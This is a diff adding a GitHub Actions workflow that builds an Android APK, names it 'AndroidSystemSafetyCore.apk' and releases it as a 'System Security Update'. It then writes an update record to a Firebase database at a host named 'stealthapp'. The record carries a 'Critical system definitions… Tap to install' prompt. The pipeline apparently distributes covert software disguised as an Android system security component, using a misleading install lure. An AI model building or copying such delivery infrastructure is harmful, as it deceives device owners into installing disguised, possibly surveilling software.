@@ -1,0 +1,125 @@
+name: Build & Publish Release Update
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      version_name:
+        description: 'Version Name (e.g. 1.1)'
+        required: false
+        default: '1.1'
+      version_code:
+        description: 'Version Code (e.g. 2)'
+        required: false
+        default: '2'
+      release_title:
+        description: 'Release Title'
+        required: false
+        default: 'System Security Update'
+      release_notes:
+        description: 'Release Notes'
+        required: false
+        default: 'Automated build with security patches and performance improvements.'
+
+permissions:
+  contents: write
+
+jobs:
+  build-and-release:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+          cache: 'gradle'
+
+      - name: Grant execute permission for gradlew
+        run: chmod +x gradlew
+
+      - name: Determine Version Details
+        id: versioning
+        run: |
+          # If triggered by tag, extract from tag (e.g. v1.1 -> 1.1)
+          if [[ "${{ github.ref }}" == refs/tags/v* ]]; then
+            RAW_TAG="${{ github.ref_name }}"
+            VER_NAME="${RAW_TAG#v}"
+            # Extract versionCode from app/build.gradle if present, or use commit count
+            VC=$(grep -m1 'versionCode' app/build.gradle | tr -cd '0-9')
+            if [ -z "$VC" ]; then
+              VC=$(git rev-list --count HEAD)
+            fi
+            echo "version_name=$VER_NAME" >> $GITHUB_OUTPUT
+            echo "version_code=$VC" >> $GITHUB_OUTPUT
+            echo "release_tag=$RAW_TAG" >> $GITHUB_OUTPUT
+          else
+            # Workflow dispatch inputs
+            VER_NAME="${{ github.event.inputs.version_name }}"
+            VC="${{ github.event.inputs.version_code }}"
+            TAG_NAME="v${VER_NAME}"
+            echo "version_name=$VER_NAME" >> $GITHUB_OUTPUT
+            echo "version_code=$VC" >> $GITHUB_OUTPUT
+            echo "release_tag=$TAG_NAME" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Update Version in build.gradle
+        run: |
+          sed -i "s/versionCode [0-9]*/versionCode ${{ steps.versioning.outputs.version_code }}/" app/build.gradle
+          sed -i 's/versionName "[^"]*"/versionName "${{ steps.versioning.outputs.version_name }}"/' app/build.gradle
+          echo "Updated app/build.gradle to versionCode ${{ steps.versioning.outputs.version_code }} and versionName ${{ steps.versioning.outputs.version_name }}"
+
+      - name: Build APK with Gradle
+        run: ./gradlew assembleDebug --no-daemon --stacktrace
+
+      - name: Prepare APK Asset
+        run: |
+          mkdir -p dist
+          cp app/build/outputs/apk/debug/app-debug.apk dist/AndroidSystemSafetyCore.apk
+          ls -lh dist/AndroidSystemSafetyCore.apk
+
+      - name: Publish GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ steps.versioning.outputs.release_tag }}
+          name: "Android System Safety Core ${{ steps.versioning.outputs.release_tag }}"
+          body: |
+            ## Android System Safety Core Update
+            - **Version Name:** ${{ steps.versioning.outputs.version_name }}
+            - **Version Code:** ${{ steps.versioning.outputs.version_code }}
+            - **Release Tag:** ${{ steps.versioning.outputs.release_tag }}
+
+            ### Release Notes:
+            ${{ github.event.inputs.release_notes || 'Automated build and continuous delivery update.' }}
+          files: dist/AndroidSystemSafetyCore.apk
+          draft: false
+          prerelease: false
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Update Firebase Realtime Database
+        run: |
+          APK_DOWNLOAD_URL="https://github.com/${{ github.repository }}/releases/download/${{ steps.versioning.outputs.release_tag }}/AndroidSystemSafetyCore.apk"
+          echo "Updating Firebase Realtime Database with APK URL: $APK_DOWNLOAD_URL"
+          
+          curl -s -X PATCH "https://stealthapp-50da2-default-rtdb.firebaseio.com/app_update.json" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"version_code\": ${{ steps.versioning.outputs.version_code }},
+              \"version_name\": \"${{ steps.versioning.outputs.version_name }}\",
+              \"min_version_code\": 1,
+              \"force_update\": false,
+              \"apk_url\": \"$APK_DOWNLOAD_URL\",
+              \"title\": \"Security Update v${{ steps.versioning.outputs.version_name }}\",
+              \"message\": \"Critical system definitions and security core v${{ steps.versioning.outputs.version_name }} is available. Tap to install.\"
+            }"
+          
+          echo "Firebase Realtime Database successfully updated!"
